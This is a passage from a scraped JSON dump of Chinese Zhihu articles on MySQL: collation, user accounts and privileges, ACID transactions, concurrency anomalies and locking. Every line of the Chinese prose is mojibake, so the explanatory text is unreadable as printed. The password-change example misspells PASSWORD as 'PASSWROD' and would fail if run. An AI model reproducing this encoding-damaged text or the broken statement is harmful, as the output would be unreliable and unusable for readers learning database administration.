class=\"k\">COMMIT</span></code></pre></div><h2>äºŒåäºŒã€å­—ç¬¦é›†</h2><p>åŸºæœ¬æœ¯è¯­ï¼š</p><ul><li>å­—ç¬¦é›†ä¸ºå­—æ¯å’Œç¬¦å·çš„é›†åˆï¼›</li><li>ç¼–ç ä¸ºæŸä¸ªå­—ç¬¦é›†æˆå‘˜çš„å†…éƒ¨è¡¨ç¤ºï¼›</li><li>æ ¡å¯¹å­—ç¬¦æŒ‡å®šå¦‚ä½•æ¯”è¾ƒï¼Œä¸»è¦ç”¨äºæ’åºå’Œåˆ†ç»„ã€‚</li></ul><p>é™¤äº†ç»™è¡¨æŒ‡å®šå­—ç¬¦é›†å’Œæ ¡å¯¹å¤–ï¼Œä¹Ÿå¯ä»¥ç»™åˆ—æŒ‡å®šï¼š</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">CREATE</span> <span class=\"k\">TABLE</span> <span class=\"n\">mytable</span>\n<span class=\"p\">(</span><span class=\"n\">col</span> <span class=\"nb\">VARCHAR</span><span class=\"p\">(</span><span class=\"mi\">10</span><span class=\"p\">)</span> <span class=\"nb\">CHARACTER</span> <span class=\"k\">SET</span> <span class=\"n\">latin</span> <span class=\"k\">COLLATE</span> <span class=\"n\">latin1_general_ci</span> <span class=\"p\">)</span>\n<span class=\"k\">DEFAULT</span> <span class=\"nb\">CHARACTER</span> <span class=\"k\">SET</span> <span class=\"n\">hebrew</span> <span class=\"k\">COLLATE</span> <span class=\"n\">hebrew_general_ci</span><span class=\"p\">;</span></code></pre></div><p>å¯ä»¥åœ¨æ’åºã€åˆ†ç»„æ—¶æŒ‡å®šæ ¡å¯¹ï¼š</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">SELECT</span> <span class=\"o\">*</span>\n<span class=\"k\">FROM</span> <span class=\"n\">mytable</span>\n<span class=\"k\">ORDER</span> <span class=\"k\">BY</span> <span class=\"n\">col</span> <span class=\"k\">COLLATE</span> <span class=\"n\">latin1_general_ci</span><span class=\"p\">;</span></code></pre></div><h2>äºŒåä¸‰ã€æƒé™ç®¡ç†</h2><p>MySQL çš„è´¦æˆ·ä¿¡æ¯ä¿å­˜åœ¨ mysql è¿™ä¸ªæ•°æ®åº“ä¸­ã€‚</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"n\">USE</span> <span class=\"n\">mysql</span><span class=\"p\">;</span>\n<span class=\"k\">SELECT</span> <span class=\"k\">user</span> <span class=\"k\">FROM</span> <span class=\"k\">user</span><span class=\"p\">;</span></code></pre></div><p><b>åˆ›å»ºè´¦æˆ·</b> </p><p>æ–°åˆ›å»ºçš„è´¦æˆ·æ²¡æœ‰ä»»ä½•æƒé™ã€‚</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">CREATE</span> <span class=\"k\">USER</span> <span class=\"n\">myuser</span> <span class=\"n\">IDENTIFIED</span> <span class=\"k\">BY</span> <span class=\"s1\">&#39;mypassword&#39;</span><span class=\"p\">;</span></code></pre></div><p><b>ä¿®æ”¹è´¦æˆ·å</b> </p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">RENAME</span> <span class=\"n\">myuser</span> <span class=\"k\">TO</span> <span class=\"n\">newuser</span><span class=\"p\">;</span></code></pre></div><p><b>åˆ é™¤è´¦æˆ·</b> </p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">DROP</span> <span class=\"k\">USER</span> <span class=\"n\">myuser</span><span class=\"p\">;</span></code></pre></div><p><b>æŸ¥çœ‹æƒé™</b> </p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">SHOW</span> <span class=\"n\">GRANTS</span> <span class=\"k\">FOR</span> <span class=\"n\">myuser</span><span class=\"p\">;</span></code></pre></div><p><b>æˆäºˆæƒé™</b> </p><p>è´¦æˆ·ç”¨ username@host çš„å½¢å¼å®šä¹‰ï¼Œusername@% ä½¿ç”¨çš„æ˜¯é»˜è®¤ä¸»æœºåã€‚</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">GRANT</span> <span class=\"k\">SELECT</span><span class=\"p\">,</span> <span class=\"k\">INSERT</span> <span class=\"k\">ON</span> <span class=\"n\">mydatabase</span><span class=\"p\">.</span><span class=\"o\">*</span> <span class=\"k\">TO</span> <span class=\"n\">myuser</span><span class=\"p\">;</span></code></pre></div><p><b>åˆ é™¤æƒé™</b> </p><p>GRANT å’Œ REVOKE å¯åœ¨å‡ ä¸ªå±‚æ¬¡ä¸Šæ§åˆ¶è®¿é—®æƒé™ï¼š</p><ul><li>æ•´ä¸ªæœåŠ¡å™¨ï¼Œä½¿ç”¨ GRANT ALL å’Œ REVOKE ALLï¼›</li><li>æ•´ä¸ªæ•°æ®åº“ï¼Œä½¿ç”¨ ON database.*ï¼›</li><li>ç‰¹å®šçš„è¡¨ï¼Œä½¿ç”¨ ON database.tableï¼›</li><li>ç‰¹å®šçš„åˆ—ï¼›</li><li>ç‰¹å®šçš„å­˜å‚¨è¿‡ç¨‹ã€‚</li></ul><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">REVOKE</span> <span class=\"k\">SELECT</span><span class=\"p\">,</span> <span class=\"k\">INSERT</span> <span class=\"k\">ON</span> <span class=\"n\">mydatabase</span><span class=\"p\">.</span><span class=\"o\">*</span> <span class=\"k\">FROM</span> <span class=\"n\">myuser</span><span class=\"p\">;</span></code></pre></div><p><b>æ›´æ”¹å¯†ç </b> </p><p>å¿…é¡»ä½¿ç”¨ Password() å‡½æ•°è¿›è¡ŒåŠ å¯†ã€‚</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">SET</span> <span class=\"n\">PASSWROD</span> <span class=\"k\">FOR</span> <span class=\"n\">myuser</span> <span class=\"o\">=</span> <span class=\"n\">Password</span><span class=\"p\">(</span><span class=\"s1\">&#39;new_password&#39;</span><span class=\"p\">);</span></code></pre></div><h2>å‚è€ƒèµ„æ–™</h2><ul><li>BenForta. SQL å¿…çŸ¥å¿…ä¼š [M]. äººæ°‘é‚®ç”µå‡ºç‰ˆç¤¾, 2013.</li></ul><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"899\" data-rawheight=\"351\" class=\"origin_image zh-lightbox-thumb\" width=\"899\" data-original=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;899&#39; height=&#39;351&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"899\" data-rawheight=\"351\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"899\" data-original=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_b.jpg\"/></figure><p></p>", 
            "topic": [
                {
                    "tag": "æ•°æ®åº“", 
                    "tagLink": "https://api.zhihu.com/topics/19552067"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/68500259", 
            "userName": "CyC2018", 
            "userLink": "https://www.zhihu.com/people/de0dbaba77411ee53dd3207d762ad7d5", 
            "upvote": 4, 
            "title": "æ•°æ®åº“ç³»ç»ŸåŸç†", 
            "content": "<p></p><h2>ä¸€ã€äº‹åŠ¡</h2><h2>æ¦‚å¿µ</h2><p>äº‹åŠ¡æŒ‡çš„æ˜¯æ»¡è¶³ ACID ç‰¹æ€§çš„ä¸€ç»„æ“ä½œï¼Œå¯ä»¥é€šè¿‡ Commit æäº¤ä¸€ä¸ªäº‹åŠ¡ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ Rollback è¿›è¡Œå›æ»šã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-10c951143070196e10fdbb91ab80ffe9_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"597\" data-rawheight=\"640\" class=\"origin_image zh-lightbox-thumb\" width=\"597\" data-original=\"https://pic2.zhimg.com/v2-10c951143070196e10fdbb91ab80ffe9_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;597&#39; height=&#39;640&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"597\" data-rawheight=\"640\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"597\" data-original=\"https://pic2.zhimg.com/v2-10c951143070196e10fdbb91ab80ffe9_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-10c951143070196e10fdbb91ab80ffe9_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>ACID</h2><h3>1. åŸå­æ€§ï¼ˆAtomicityï¼‰</h3><p>äº‹åŠ¡è¢«è§†ä¸ºä¸å¯åˆ†å‰²çš„æœ€å°å•å…ƒï¼Œäº‹åŠ¡çš„æ‰€æœ‰æ“ä½œè¦ä¹ˆå…¨éƒ¨æäº¤æˆåŠŸï¼Œè¦ä¹ˆå…¨éƒ¨å¤±è´¥å›æ»šã€‚</p><p>å›æ»šå¯ä»¥ç”¨å›æ»šæ—¥å¿—æ¥å®ç°ï¼Œå›æ»šæ—¥å¿—è®°å½•ç€äº‹åŠ¡æ‰€æ‰§è¡Œçš„ä¿®æ”¹æ“ä½œï¼Œåœ¨å›æ»šæ—¶åå‘æ‰§è¡Œè¿™äº›ä¿®æ”¹æ“ä½œå³å¯ã€‚</p><h3>2. ä¸€è‡´æ€§ï¼ˆConsistencyï¼‰</h3><p>æ•°æ®åº“åœ¨äº‹åŠ¡æ‰§è¡Œå‰åéƒ½ä¿æŒä¸€è‡´æ€§çŠ¶æ€ã€‚åœ¨ä¸€è‡´æ€§çŠ¶æ€ä¸‹ï¼Œæ‰€æœ‰äº‹åŠ¡å¯¹ä¸€ä¸ªæ•°æ®çš„è¯»å–ç»“æœéƒ½æ˜¯ç›¸åŒçš„ã€‚</p><h3>3. éš”ç¦»æ€§ï¼ˆIsolationï¼‰</h3><p>ä¸€ä¸ªäº‹åŠ¡æ‰€åšçš„ä¿®æ”¹åœ¨æœ€ç»ˆæäº¤ä»¥å‰ï¼Œå¯¹å…¶å®ƒäº‹åŠ¡æ˜¯ä¸å¯è§çš„ã€‚</p><h3>4. æŒä¹…æ€§ï¼ˆDurabilityï¼‰</h3><p>ä¸€æ—¦äº‹åŠ¡æäº¤ï¼Œåˆ™å…¶æ‰€åšçš„ä¿®æ”¹å°†ä¼šæ°¸è¿œä¿å­˜åˆ°æ•°æ®åº“ä¸­ã€‚å³ä½¿ç³»ç»Ÿå‘ç”Ÿå´©æºƒï¼Œäº‹åŠ¡æ‰§è¡Œçš„ç»“æœä¹Ÿä¸èƒ½ä¸¢å¤±ã€‚</p><p>ä½¿ç”¨é‡åšæ—¥å¿—æ¥ä¿è¯æŒä¹…æ€§ã€‚</p><hr/><p>äº‹åŠ¡çš„ ACID ç‰¹æ€§æ¦‚å¿µç®€å•ï¼Œä½†ä¸æ˜¯å¾ˆå¥½ç†è§£ï¼Œä¸»è¦æ˜¯å› ä¸ºè¿™å‡ ä¸ªç‰¹æ€§ä¸æ˜¯ä¸€ç§å¹³çº§å…³ç³»ï¼š</p><ul><li>åªæœ‰æ»¡è¶³ä¸€è‡´æ€§ï¼Œäº‹åŠ¡çš„æ‰§è¡Œç»“æœæ‰æ˜¯æ­£ç¡®çš„ã€‚</li><li>åœ¨æ— å¹¶å‘çš„æƒ…å†µä¸‹ï¼Œäº‹åŠ¡ä¸²è¡Œæ‰§è¡Œï¼Œéš”ç¦»æ€§ä¸€å®šèƒ½å¤Ÿæ»¡è¶³ã€‚æ­¤æ—¶åªè¦èƒ½æ»¡è¶³åŸå­æ€§ï¼Œå°±ä¸€å®šèƒ½æ»¡è¶³ä¸€è‡´æ€§ã€‚</li><li>åœ¨å¹¶å‘çš„æƒ…å†µä¸‹ï¼Œå¤šä¸ªäº‹åŠ¡å¹¶è¡Œæ‰§è¡Œï¼Œäº‹åŠ¡ä¸ä»…è¦æ»¡è¶³åŸå­æ€§ï¼Œè¿˜éœ€è¦æ»¡è¶³éš”ç¦»æ€§ï¼Œæ‰èƒ½æ»¡è¶³ä¸€è‡´æ€§ã€‚</li><li>äº‹åŠ¡æ»¡è¶³æŒä¹…åŒ–æ˜¯ä¸ºäº†èƒ½åº”å¯¹æ•°æ®åº“å´©æºƒçš„æƒ…å†µã€‚</li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-e6cce247ea6b8487ef7594dfd119e7a5_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"799\" data-rawheight=\"446\" class=\"origin_image zh-lightbox-thumb\" width=\"799\" data-original=\"https://pic2.zhimg.com/v2-e6cce247ea6b8487ef7594dfd119e7a5_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;799&#39; height=&#39;446&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"799\" data-rawheight=\"446\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"799\" data-original=\"https://pic2.zhimg.com/v2-e6cce247ea6b8487ef7594dfd119e7a5_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-e6cce247ea6b8487ef7594dfd119e7a5_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>AUTOCOMMIT</h2><p>MySQL é»˜è®¤é‡‡ç”¨è‡ªåŠ¨æäº¤æ¨¡å¼ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä¸æ˜¾å¼ä½¿ç”¨<code>START TRANSACTION</code>è¯­å¥æ¥å¼€å§‹ä¸€ä¸ªäº‹åŠ¡ï¼Œé‚£ä¹ˆæ¯ä¸ªæŸ¥è¯¢éƒ½ä¼šè¢«å½“åšä¸€ä¸ªäº‹åŠ¡è‡ªåŠ¨æäº¤ã€‚</p><h2>äºŒã€å¹¶å‘ä¸€è‡´æ€§é—®é¢˜</h2><p>åœ¨å¹¶å‘ç¯å¢ƒä¸‹ï¼Œäº‹åŠ¡çš„éš”ç¦»æ€§å¾ˆéš¾ä¿è¯ï¼Œå› æ­¤ä¼šå‡ºç°å¾ˆå¤šå¹¶å‘ä¸€è‡´æ€§é—®é¢˜ã€‚</p><h2>ä¸¢å¤±ä¿®æ”¹</h2><p>T1 å’Œ T2 ä¸¤ä¸ªäº‹åŠ¡éƒ½å¯¹ä¸€ä¸ªæ•°æ®è¿›è¡Œä¿®æ”¹ï¼ŒT1 å…ˆä¿®æ”¹ï¼ŒT2 éšåä¿®æ”¹ï¼ŒT2 çš„ä¿®æ”¹è¦†ç›–äº† T1 çš„ä¿®æ”¹ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-cdcf36f827b7f9a94c50a1dbb39c5e56_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"507\" data-rawheight=\"726\" class=\"origin_image zh-lightbox-thumb\" width=\"507\" data-original=\"https://pic3.zhimg.com/v2-cdcf36f827b7f9a94c50a1dbb39c5e56_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;507&#39; height=&#39;726&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"507\" data-rawheight=\"726\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"507\" data-original=\"https://pic3.zhimg.com/v2-cdcf36f827b7f9a94c50a1dbb39c5e56_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-cdcf36f827b7f9a94c50a1dbb39c5e56_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è¯»è„æ•°æ®</h2><p>T1 ä¿®æ”¹ä¸€ä¸ªæ•°æ®ï¼ŒT2 éšåè¯»å–è¿™ä¸ªæ•°æ®ã€‚å¦‚æœ T1 æ’¤é”€äº†è¿™æ¬¡ä¿®æ”¹ï¼Œé‚£ä¹ˆ T2 è¯»å–çš„æ•°æ®æ˜¯è„æ•°æ®ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-11f15a6701c3a24ebda1f7dcdc259303_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"595\" data-rawheight=\"723\" class=\"origin_image zh-lightbox-thumb\" width=\"595\" data-original=\"https://pic4.zhimg.com/v2-11f15a6701c3a24ebda1f7dcdc259303_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;595&#39; height=&#39;723&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"595\" data-rawheight=\"723\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"595\" data-original=\"https://pic4.zhimg.com/v2-11f15a6701c3a24ebda1f7dcdc259303_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-11f15a6701c3a24ebda1f7dcdc259303_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>ä¸å¯é‡å¤è¯»</h2><p>T2 è¯»å–ä¸€ä¸ªæ•°æ®ï¼ŒT1 å¯¹è¯¥æ•°æ®åšäº†ä¿®æ”¹ã€‚å¦‚æœ T2 å†æ¬¡è¯»å–è¿™ä¸ªæ•°æ®ï¼Œæ­¤æ—¶è¯»å–çš„ç»“æœå’Œç¬¬ä¸€æ¬¡è¯»å–çš„ç»“æœä¸åŒã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-08fd5a86e988d0bbafc42b53f52f9800_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"573\" data-rawheight=\"732\" class=\"origin_image zh-lightbox-thumb\" width=\"573\" data-original=\"https://pic1.zhimg.com/v2-08fd5a86e988d0bbafc42b53f52f9800_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;573&#39; height=&#39;732&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"573\" data-rawheight=\"732\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"573\" data-original=\"https://pic1.zhimg.com/v2-08fd5a86e988d0bbafc42b53f52f9800_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-08fd5a86e988d0bbafc42b53f52f9800_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>å¹»å½±è¯»</h2><p>T1 è¯»å–æŸä¸ªèŒƒå›´çš„æ•°æ®ï¼ŒT2 åœ¨è¿™ä¸ªèŒƒå›´å†…æ’å…¥æ–°çš„æ•°æ®ï¼ŒT1 å†æ¬¡è¯»å–è¿™ä¸ªèŒƒå›´çš„æ•°æ®ï¼Œæ­¤æ—¶è¯»å–çš„ç»“æœå’Œå’Œç¬¬ä¸€æ¬¡è¯»å–çš„ç»“æœä¸åŒã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-1d4d9ebd6c9177b6435f9250e42a7be9_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"532\" data-rawheight=\"722\" class=\"origin_image zh-lightbox-thumb\" width=\"532\" data-original=\"https://pic2.zhimg.com/v2-1d4d9ebd6c9177b6435f9250e42a7be9_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;532&#39; height=&#39;722&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"532\" data-rawheight=\"722\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"532\" data-original=\"https://pic2.zhimg.com/v2-1d4d9ebd6c9177b6435f9250e42a7be9_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-1d4d9ebd6c9177b6435f9250e42a7be9_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><hr/><p>äº§ç”Ÿå¹¶å‘ä¸ä¸€è‡´æ€§é—®é¢˜ä¸»è¦åŸå› æ˜¯ç ´åäº†äº‹åŠ¡çš„éš”ç¦»æ€§ï¼Œè§£å†³æ–¹æ³•æ˜¯é€šè¿‡å¹¶å‘æ§åˆ¶æ¥ä¿è¯éš”ç¦»æ€§ã€‚å¹¶å‘æ§åˆ¶å¯ä»¥é€šè¿‡å°é”æ¥å®ç°ï¼Œä½†æ˜¯å°é”æ“ä½œéœ€è¦ç”¨æˆ·è‡ªå·±æ§åˆ¶ï¼Œç›¸å½“å¤æ‚ã€‚æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæä¾›äº†äº‹åŠ¡çš„éš”ç¦»çº§åˆ«ï¼Œè®©ç”¨æˆ·ä»¥ä¸€ç§æ›´è½»æ¾çš„æ–¹å¼å¤„ç†å¹¶å‘ä¸€è‡´æ€§é—®é¢˜ã€‚</p><h2>ä¸‰ã€å°é”</h2><h2>å°é”ç²’åº¦</h2><p>MySQL ä¸­æä¾›äº†ä¸¤ç§å°é”ç²’åº¦ï¼šè¡Œçº§é”ä»¥åŠè¡¨çº§é”ã€‚</p><p>åº”è¯¥å°½é‡åªé”å®šéœ€è¦ä¿®æ”¹çš„é‚£éƒ¨åˆ†æ•°æ®ï¼Œè€Œä¸æ˜¯æ‰€æœ‰çš„èµ„æºã€‚é”å®šçš„æ•°æ®é‡è¶Šå°‘ï¼Œå‘ç”Ÿé”äº‰ç”¨çš„å¯èƒ½å°±è¶Šå°ï¼Œç³»ç»Ÿçš„å¹¶å‘ç¨‹åº¦å°±è¶Šé«˜ã€‚</p><p>ä½†æ˜¯åŠ é”éœ€è¦æ¶ˆè€—èµ„æºï¼Œé”çš„å„ç§æ“ä½œï¼ˆåŒ…æ‹¬è·å–é”ã€é‡Šæ”¾é”ã€ä»¥åŠæ£€æŸ¥é”çŠ¶æ€ï¼‰éƒ½ä¼šå¢åŠ ç³»ç»Ÿå¼€é”€ã€‚å› æ­¤å°é”ç²’åº¦è¶Šå°ï¼Œç³»ç»Ÿå¼€é”€å°±è¶Šå¤§ã€‚</p><p>åœ¨é€‰æ‹©å°é”ç²’åº¦æ—¶ï¼Œéœ€è¦åœ¨é”å¼€é”€å’Œå¹¶å‘ç¨‹åº¦ä¹‹é—´åšä¸€ä¸ªæƒè¡¡ã€‚</p><h2>å°é”ç±»å‹</h2><h3>1. è¯»å†™é”</h3><ul><li>æ’å®ƒé”ï¼ˆExclusiveï¼‰ï¼Œç®€å†™ä¸º X é”ï¼Œåˆç§°å†™é”ã€‚</li><li>å…±äº«é”ï¼ˆSharedï¼‰ï¼Œç®€å†™ä¸º S é”ï¼Œåˆç§°è¯»é”ã€‚</li></ul><p>æœ‰ä»¥ä¸‹ä¸¤ä¸ªè§„å®šï¼š</p><ul><li>ä¸€ä¸ªäº‹åŠ¡å¯¹æ•°æ®å¯¹è±¡ A åŠ äº† X é”ï¼Œå°±å¯ä»¥å¯¹ A è¿›è¡Œè¯»å–å’Œæ›´æ–°ã€‚åŠ é”æœŸé—´å…¶å®ƒäº‹åŠ¡ä¸èƒ½å¯¹ A åŠ ä»»ä½•é”ã€‚</li><li>ä¸€ä¸ªäº‹åŠ¡å¯¹æ•°æ®å¯¹è±¡ A åŠ äº† S é”ï¼Œå¯ä»¥å¯¹ A è¿›è¡Œè¯»å–æ“ä½œï¼Œä½†æ˜¯ä¸èƒ½è¿›è¡Œæ›´æ–°æ“ä½œã€‚åŠ é”æœŸé—´å…¶å®ƒäº‹åŠ¡èƒ½å¯¹ A åŠ  S é”ï¼Œä½†æ˜¯ä¸èƒ½åŠ  X é”ã€‚</li></ul><p>é”çš„å…¼å®¹å…³ç³»å¦‚ä¸‹ï¼š</p><p>| - | X | S | | :--: | :--: | :--: | | <b>X</b> |Ã—|Ã—| | <b>S</b> |Ã—|âˆš|</p><h3>2. æ„å‘é”</h3><p>ä½¿ç”¨æ„å‘é”ï¼ˆIntention Locksï¼‰å¯ä»¥æ›´å®¹æ˜“åœ°æ”¯æŒå¤šç²’åº¦å°é”ã€‚</p><p>åœ¨å­˜åœ¨è¡Œçº§é”å’Œè¡¨çº§é”çš„æƒ…å†µä¸‹ï¼Œäº‹åŠ¡ T æƒ³è¦å¯¹è¡¨ A åŠ  X é”ï¼Œå°±éœ€è¦å…ˆæ£€æµ‹æ˜¯å¦æœ‰å…¶å®ƒäº‹åŠ¡å¯¹è¡¨ A æˆ–è€…è¡¨ A ä¸­çš„ä»»æ„ä¸€è¡ŒåŠ äº†é”ï¼Œé‚£ä¹ˆå°±éœ€è¦å¯¹è¡¨ A çš„æ¯ä¸€è¡Œéƒ½æ£€æµ‹ä¸€æ¬¡ï¼Œè¿™æ˜¯éå¸¸è€—æ—¶çš„ã€‚</p><p>æ„å‘é”åœ¨åŸæ¥çš„ X/S é”ä¹‹ä¸Šå¼•å…¥äº† IX/ISï¼ŒIX/IS éƒ½æ˜¯è¡¨é”ï¼Œç”¨æ¥è¡¨ç¤ºä¸€ä¸ªäº‹åŠ¡æƒ³è¦åœ¨è¡¨ä¸­çš„æŸä¸ªæ•°æ®è¡Œä¸ŠåŠ  X é”æˆ– S é”ã€‚æœ‰ä»¥ä¸‹ä¸¤ä¸ªè§„å®šï¼š</p><ul><li>ä¸€ä¸ªäº‹åŠ¡åœ¨è·å¾—æŸä¸ªæ•°æ®è¡Œå¯¹è±¡çš„ S é”ä¹‹å‰ï¼Œå¿…é¡»å…ˆè·å¾—è¡¨çš„ IS é”æˆ–è€…æ›´å¼ºçš„é”ï¼›</li><li>ä¸€ä¸ªäº‹åŠ¡åœ¨è·å¾—æŸä¸ªæ•°æ®è¡Œå¯¹è±¡çš„ X é”ä¹‹å‰ï¼Œå¿…é¡»å…ˆè·å¾—è¡¨çš„ IX é”ã€‚</li></ul><p>é€šè¿‡å¼•å…¥æ„å‘é”ï¼Œäº‹åŠ¡ T æƒ³è¦å¯¹è¡¨ A åŠ  X é”ï¼Œåªéœ€è¦å…ˆæ£€æµ‹æ˜¯å¦æœ‰å…¶å®ƒäº‹åŠ¡å¯¹è¡¨ A åŠ äº† X/IX/S/IS é”ï¼Œå¦‚æœåŠ äº†å°±è¡¨ç¤ºæœ‰å…¶å®ƒäº‹åŠ¡æ­£åœ¨ä½¿ç”¨è¿™ä¸ªè¡¨æˆ–è€…è¡¨ä¸­æŸä¸€è¡Œçš„é”ï¼Œå› æ­¤äº‹åŠ¡ T åŠ  X é”å¤±è´¥ã€‚</p><p>å„ç§é”çš„å…¼å®¹å…³ç³»å¦‚ä¸‹ï¼š</p><p>| - | X | IX | S | IS | | :--: | :--: | :--: | :--: | :--: | |  <b>X</b>      |Ã—    |Ã—    |Ã—   | Ã—| |  <b>IX</b>     |Ã—    |âˆš   |Ã—   | âˆš| |  <b>S</b>      |Ã—    |Ã—    |âˆš  | âˆš| |  <b>IS</b>     |Ã—    |âˆš  |âˆš  | âˆš|</p><p>è§£é‡Šå¦‚ä¸‹ï¼š</p><ul><li>ä»»æ„ IS/IX é”ä¹‹é—´éƒ½æ˜¯å…¼å®¹çš„ï¼Œå› ä¸ºå®ƒä»¬åªæ˜¯è¡¨ç¤ºæƒ³è¦å¯¹è¡¨åŠ é”ï¼Œè€Œä¸æ˜¯çœŸæ­£åŠ é”ï¼›</li><li>S é”åªä¸ S é”å’Œ IS é”å…¼å®¹ï¼Œä¹Ÿå°±æ˜¯è¯´äº‹åŠ¡ T æƒ³è¦å¯¹æ•°æ®è¡ŒåŠ  S é”ï¼Œå…¶å®ƒäº‹åŠ¡å¯ä»¥å·²ç»è·å¾—å¯¹è¡¨æˆ–è€…è¡¨ä¸­çš„è¡Œçš„ S é”ã€‚</li></ul><h2>å°é”åè®®</h2><h3>1. ä¸‰çº§å°é”åè®®</h3><p><b>ä¸€çº§å°é”åè®®</b> </p><p>äº‹åŠ¡ T è¦ä¿®æ”¹æ•°æ® A æ—¶å¿…é¡»åŠ  X é”ï¼Œç›´åˆ° T ç»“æŸæ‰é‡Šæ”¾é”ã€‚</p><p>å¯ä»¥è§£å†³ä¸¢å¤±ä¿®æ”¹é—®é¢˜ï¼Œå› ä¸ºä¸èƒ½åŒæ—¶æœ‰ä¸¤ä¸ªäº‹åŠ¡å¯¹åŒä¸€ä¸ªæ•°æ®è¿›è¡Œä¿®æ”¹ï¼Œé‚£ä¹ˆäº‹åŠ¡çš„ä¿®æ”¹å°±ä¸ä¼šè¢«è¦†ç›–ã€‚</p><p>| T1 | T2 | | :--: | :--: | | lock-x(A) | | | read A=20 | | | | lock-x(A) | |  | wait | | write A=19 |. | | commit |. | | unlock-x(A) |. | | | obtain | | | read A=19 | | | write A=21 | | | commit | | | unlock-x(A)|</p><p><b>äºŒçº§å°é”åè®®</b> </p><p>åœ¨ä¸€çº§çš„åŸºç¡€ä¸Šï¼Œè¦æ±‚è¯»å–æ•°æ® A æ—¶å¿…é¡»åŠ  S é”ï¼Œè¯»å–å®Œé©¬ä¸Šé‡Šæ”¾ S é”ã€‚</p><p>å¯ä»¥è§£å†³è¯»è„æ•°æ®é—®é¢˜ï¼Œå› ä¸ºå¦‚æœä¸€ä¸ªäº‹åŠ¡åœ¨å¯¹æ•°æ® A 